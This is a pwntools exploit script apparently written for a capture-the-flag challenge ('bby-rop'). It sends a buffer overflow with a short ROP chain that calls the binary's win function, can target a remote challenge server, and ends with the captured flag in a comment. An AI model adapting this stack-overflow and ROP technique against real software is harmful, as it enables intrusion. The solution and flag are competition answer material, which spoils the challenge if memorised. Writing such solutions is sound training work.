#!/usr/bin/python3
from pwn import *
gs = '''
b main
continue
'''
elf = context.binary = ELF('./out')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./out', gdbscript=gs)
    if args.REMOTE:

        return remote('tjc.tf', 31457)
    else:
        return process('./out')
r = start()
r.timeout = 1
#========= exploit here ===================
libc = elf.libc
#0x0000000000401016: ret
poprdi = 0x0040117a
ret = 0x401016


payload = b"A"*0x10
payload += p64(poprdi)
payload += p64(0xdeadbeef)
payload += p64(elf.sym.win)

r.sendline(payload)



#========= interactive ====================
r.interactive()

#tjctf{bby-rop-1823721665as87d86a5}

